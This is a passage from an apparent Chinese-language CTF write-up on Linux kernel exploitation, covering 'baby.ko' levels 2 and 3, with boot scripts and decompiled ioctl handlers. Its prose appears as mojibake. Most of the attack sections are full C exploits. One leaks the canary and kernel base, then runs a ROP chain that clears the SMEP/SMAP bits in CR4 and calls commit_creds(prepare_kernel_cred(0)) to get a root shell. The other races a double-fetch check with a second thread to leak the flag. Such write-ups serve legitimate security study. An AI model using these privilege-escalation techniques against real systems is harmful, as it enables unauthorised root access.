<h3 id="0x1-5-é—®é¢˜"><a href="#0x1-5-é—®é¢˜" class="headerlink" title="0x1.5 é—®é¢˜"></a>0x1.5 é—®é¢˜</h3><p>ä½¿ç”¨<code>add-symbol-file baby.ko 0x0</code>å¹¶ä¸èƒ½æ–­æˆåŠŸkoæ–‡ä»¶çš„å‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>lsmod</code>å¾—çŸ¥koæ–‡ä»¶çš„é¦–åœ°å€ï¼Œç„¶ååˆ©ç”¨å…·ä½“åœ°å€æ–­ç‚¹ï¼Œè€Œä¸æ˜¯é€šè¿‡å‡½æ•°å</p>
<h2 id="0x2-level2"><a href="#0x2-level2" class="headerlink" title="0x2 level2"></a>0x2 level2</h2><h3 id="0x2-1-boot-sh"><a href="#0x2-1-boot-sh" class="headerlink" title="0x2.1 boot.sh"></a>0x2.1 boot.sh</h3><p>éš¾åº¦å‡çº§ï¼Œå¼€èµ·äº†smep,smapå’Œkaslr,ä¸ºäº†æ–¹ä¾¿è°ƒè¯•å…ˆå…³é—­kaslr.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="0x2-2-koæ–‡ä»¶ä¿æŠ¤"><a href="#0x2-2-koæ–‡ä»¶ä¿æŠ¤" class="headerlink" title="0x2.2 koæ–‡ä»¶ä¿æŠ¤"></a>0x2.2 koæ–‡ä»¶ä¿æŠ¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.ko</span><br><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwnstudy/level2/baby.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>æ¯”åŸæ¥å¤šäº†canaryä¿æŠ¤</p>
<h3 id="0x2-3-baby-ko"><a href="#0x2-3-baby-ko" class="headerlink" title="0x2.3 baby.ko"></a>0x2.3 baby.ko</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD v5[<span class="number">18</span>]; <span class="comment">// [rsp-90h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5[<span class="number">17</span>] = v2;</span><br><span class="line">  v5[<span class="number">16</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">24577</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)copy_from_user(v5, v3, <span class="number">512LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">24578</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)copy_to_user(v3, v5, <span class="number">512LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨æ³„éœ²å’Œæº¢å‡ºï¼Œå…·ä½“æ€è·¯å°±æ˜¯å…ˆæ³„éœ²canaryå’Œå†…æ ¸åœ°å€ï¼Œç„¶åå†æº¢å‡ºå®Œæˆææƒï¼Œææƒæœ‰ä¸¤ç§æ€è·¯ï¼Œä¸€ä¸ªæ–¹å¼æ˜¯æ”¹å˜smepå’Œsmapçš„æ ‡å¿—ä½ç„¶året2usr,ä¸€ç§æ–¹å¼æ˜¯ç›´æ¥rop</p>
<h3 id="0x2-4-exp"><a href="#0x2-4-exp" class="headerlink" title="0x2.4 exp"></a>0x2.4 exp</h3><p>æˆ‘é‡‡ç”¨çš„æ˜¯æ›´æ”¹cr4å®Œæˆcommits(prepare_kernel_cred(0))å®Œæˆææƒã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds_offset=<span class="number">0xb99d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_offset=<span class="number">0xb9d80</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds=vmlinux_base_addr+commit_creds_offset;</span><br><span class="line">    <span class="keyword">size_t</span> prepare_kernel_cred=vmlinux_base_addr+prepare_kernel_cred_offset;</span><br><span class="line">     (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x6002</span>,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=buf[<span class="number">16</span>];</span><br><span class="line">    vmlinux_base_addr=buf[<span class="number">9</span>]<span class="number">-0x29b078</span>;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_pop_rbp_ret=vmlinux_base_addr+<span class="number">0xffffffff81070834</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> itretq=vmlinux_base_addr+<span class="number">0xffffffff81036a5b</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4_pop_rbp_ret=vmlinux_base_addr+<span class="number">0xffffffff81020300</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_rbx=vmlinux_base_addr+<span class="number">0xffffffff81087c99</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">16</span>;</span><br><span class="line">    rop[i++]=canary;</span><br><span class="line">    i++;</span><br><span class="line">    rop[i++]=pop_rdi_rbx;</span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=mov_cr4_pop_rbp_ret;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    rop[i++]=swapgs_pop_rbp_ret;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=itretq;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line">    ioctl(fd,<span class="number">0x6001</span>,rop);</span><br></pre></td></tr></table></figure>

<h2 id="0x3-level3"><a href="#0x3-level3" class="headerlink" title="0x3 level3"></a>0x3 level3</h2><h3 id="0x3-1-start-sh"><a href="#0x3-1-start-sh" class="headerlink" title="0x3.1 start.sh"></a>0x3.1 start.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M -smp 2,cores=2,threads=1  \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-22-generic \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>-smp 2,cores=2,threads=1</code>çš„ä½œç”¨å¦‚ä¸‹</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220406200817128.png" alt="image-20220406200817128"></p>
<p>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå†…æ ¸å¯ä»¥å¼€è‡³å¤šä¸¤ä¸ªçº¿ç¨‹äº†ã€‚</p>
<h3 id="0x3-2-init"><a href="#0x3-2-init" class="headerlink" title="0x3.2 init"></a>0x3.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">echo &quot;flag&#123;this_is_a_sample_flag&#125;&quot; &gt; flag</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod baby.ko</span><br><span class="line">chmod 777 /dev/baby</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<h3 id="0x3-3-koæ–‡ä»¶"><a href="#0x3-3-koæ–‡ä»¶" class="headerlink" title="0x3.3 koæ–‡ä»¶"></a>0x3.3 koæ–‡ä»¶</h3><p>ä¸€ä¸ªå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">26214</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">4919</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)v5,</span><br><span class="line">               *(<span class="keyword">int</span> *)(v5 + <span class="number">8</span>),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(v5 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†æï¼šå…è®¸ä¼ å…¥ä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆï¼Œç»“æ„ä½“é•¿è¿™ä¸ªæ ·å­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br></pre></td></tr></table></figure>

<p>ä»–ä¼šæ£€æŸ¥buf+lençš„åœ°å€åˆæ²¡æœ‰è¶…å‡ºç”¨æˆ·æ€çš„æœ€é«˜åœ°å€ï¼Œå¦‚æœè¶…å‡ºäº†å°±ä¼šé€€å‡ºï¼Œå¦‚æœæ²¡æœ‰è¶…å‡ºå°±ä¼šæ‹¿bufçš„å­—ç¬¦ä¸€ä¸ªä¸ªå’Œflagæ¯”å¯¹ï¼Œå¦‚æœå…¨éƒ¨æ¯”å¯¹æˆåŠŸå°±ä¼šè¿”å›flagå€¼ã€‚</p>
<p>æ¼æ´åˆ©ç”¨ï¼šè¿™ä¸ªå†…æ ¸å…è®¸å¼€ä¸¤ä¸ªçº¿ç¨‹ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä¸»çº¿ç¨‹ä¼ å…¥æ­£å¸¸çš„mç„¶åå¼€å¯ä¸€ä¸ªæ”¯çº¿ç¨‹ä¸€ç›´ä¿®æ”¹mçš„bufä¸ºflag_addr,è¿™æ ·æ”¯çº¿ç¨‹å°±æœ‰å‡ ç‡å½“ä¸»çº¿ç¨‹åˆšæ£€æŸ¥å®Œmåæ”¯çº¿ç¨‹ä¿®æ”¹m.buf=flag_addr,è¿™æ ·å°±èƒ½æ¯”å¯¹æˆåŠŸè¾“å‡ºflagå€¼äº†ã€‚</p>
<h3 id="0x3-4"><a href="#0x3-4" class="headerlink" title="0x3.4"></a>0x3.4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">size_t</span> flag_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        m.buf=flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Your flag is at &#x27; &gt; ./flag_addr.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> temp_fd=open(<span class="string">&quot;./flag_addr.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="string">&quot;[    2.817016] Your flag is at &quot;</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">size_t</span> flag_addr=strtoull(buf+len,buf+len+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag_addr:%d\n&quot;</span>,flag_addr);</span><br><span class="line">    m.buf=buf;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        m.len=i;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">22</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;flag_len:%d\n&quot;</span>,i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_flag_addr,flag_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;</span><br><span class="line">        m.buf=buf;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;susses\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Looks like the flag is&#x27; &gt; ./flag.txt&quot;</span>);</span><br><span class="line">    temp_fd=open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    write(STDOUT_FILENO,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-5-æ”¶è·"><a href="#0x3-5-æ”¶è·" class="headerlink" title="0x3.5 æ”¶è·"></a>0x3.5 æ”¶è·</h3><p>1.ç¬¬ä¸€æ¬¡åšå¤šçº¿ç¨‹çš„å†…æ ¸é¢˜ï¼Œä¸»è¦åˆ©ç”¨å§¿åŠ¿å°±æ˜¯é€šè¿‡ä¸»çº¿ç¨‹å®Œæˆæ£€æŸ¥åæ”¯çº¿ç¨‹ä¿®æ”¹æ•°æ®ã€‚</p>
<p>2.strtoullå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è½¬æ¢å­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯è¦è½¬æ¢çš„å­—ç¬¦ä¸²çš„æœ€åä¸€ä¸ªåœ°å€çš„åä¸€ä¸ªåœ°å€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¿›åˆ¶ï¼Œè¿”å›ä¸€ä¸ª8å­—èŠ‚æ•°ã€‚</p>
<h2 id="0x4-level4"><a href="#0x4-level4" class="headerlink" title="0x4 level4"></a>0x4 level4</h2><h3 id="0x4-1-start-sh"><a href="#0x4-1-start-sh" class="headerlink" title="0x4.1 start.sh"></a>0x4.1 start.sh</h3><p>ä¿æŠ¤å…¨å¼€ï¼Œæœ¬åœ°è°ƒè¯•çš„æ—¶å€™å…ˆå…³é—­kaslr.</p>
